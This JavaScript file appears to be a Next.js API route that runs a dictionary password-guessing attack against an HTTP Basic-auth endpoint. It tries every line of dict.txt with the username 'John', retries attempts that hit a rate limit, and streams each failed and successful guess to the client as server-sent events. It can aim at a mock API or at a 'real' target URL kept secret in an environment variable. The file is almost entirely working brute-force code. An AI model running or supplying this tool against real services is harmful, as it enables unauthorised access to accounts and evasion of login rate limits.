import fs from 'fs';
import path from 'path';
import axios from 'axios';
import Bottleneck from 'bottleneck';

//Config
const USERNAME = "John";

//Password Check Function
async function checkPassword(password, targetUrl) {
    try {
        const response = await axios.get(targetUrl, {
            auth: { username: USERNAME, password: password }
        });

        const responseData = response.data;
        let url;

        if (typeof responseData === 'object' && responseData.url) {
            //It's a JSON object
            url = responseData.url;
        } else {
            //It's a text string
            url = responseData; 
        }

        if (!url || typeof url !== 'string' || !url.startsWith('http')) {
             //200 OK but the body was empty or not a URL
             console.error(`Success response for ${password}, but no URL found.`);
             return { success: false, password: password };
        }

        //Success case:
        console.log(`Success, Password is: ${password}`);
        return {success: true, url: url, password: password };

    } catch (error) {
        if (error.response?.status === 401){
            console.log(`Incorrect Password: ${password}`);
        } else if (error.response?.status === 429) {
            console.warn(`RATE LIMIT HIT for ${password}.`);
            return { success: false, retry: true, password: password };
        } else {
            console.error(`Error for ${password}:`, error.message);
        }
        return { success: false };
    }
}

//GET Handler for Streaming
export async function GET(request) {

    //New limiter and wrapper per request. Fixes my issue where I had to ungracefully stop the limiter and then couldn't run it again.
    const limiter = new Bottleneck({ minTime: 112});
    const wrappedCheck = limiter.wrap(checkPassword);
    //Read the target query
    const { searchParams } = new URL(request.url);
    const target = searchParams.get('target');

    //Select the URL based on the query
    let TARGET_URL;
    if (target === 'real') {
        TARGET_URL = process.env.TARGET_API_URL_SECRET;
    } else {
        // Check if in production or development
        TARGET_URL = process.env.NODE_ENV === 'production'
            ? process.env.MOCK_API_INTERNAL_URL  // Use Docker URL
            : process.env.MOCK_API_LOCAL_URL;    // Use Localhost URL
    }

    const dictPath = path.join(process.cwd(), 'dict.txt');
    if (!fs.existsSync(dictPath)) {
        return new Response(JSON.stringify({ error: "dict.txt not found on server" }), { status: 500 });
    }
    
    const passwords = fs.readFileSync(dictPath, 'utf-8').split('\n').filter(p => p);
    
    const stream = new ReadableStream({
        async start(controller) {
            const encoder = new TextEncoder();
            const sendEvent = (data) => {
                controller.enqueue(encoder.encode(`data: ${JSON.stringify(data)}\n\n`));
            };

            sendEvent({ type: 'log', message: `Starting attack on ${TARGET_URL}...` });
            
            let successfulUrl = null;
            let attackComplete = false;

            const promises = passwords.map((password) => {
                if (attackComplete) return Promise.resolve(null);

                return wrappedCheck(password, TARGET_URL)
                    .then(result => {
                        if (result?.success) {
                            successfulUrl = result.url;
                            attackComplete = true; 
                            limiter.stop(); // Stop the queue!
                            sendEvent({ type: 'success', message: `✅ Success: ${password}`, url: result.url });
                        } else if (result?.retry && !attackComplete) {
                            sendEvent({ type: 'log', message: `RATE LIMIT, retrying ${password}...` });
                            // Re-queue
                            return wrappedCheck(result.password, TARGET_URL).then(res => {
                                if (res?.success) {
                                    successfulUrl = res.url;
                                    attackComplete = true;
                                    limiter.stop();
                                    sendEvent({ type: 'success', message: `✅ Success: ${password}`, url: res.url });
                                }
                            });
                        } else if (!attackComplete) {
                            sendEvent({ type: 'fail', message: `❌ Failed: ${password}` });
                        }
                        return result;
                    })
                    .catch(e => {
                        if (!e.message.includes("limiter has been stopped")) {
                            console.error("Attack stream error:", e);
                        }
                    });
            });

            await Promise.all(promises.filter(p => p !== null));

            sendEvent({ type: 'done', message: 'Attack finished.' });
            controller.close();
        }
    });

    return new Response(stream, {
        headers: {
            'Content-Type': 'text/event-stream',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
        },
    });
}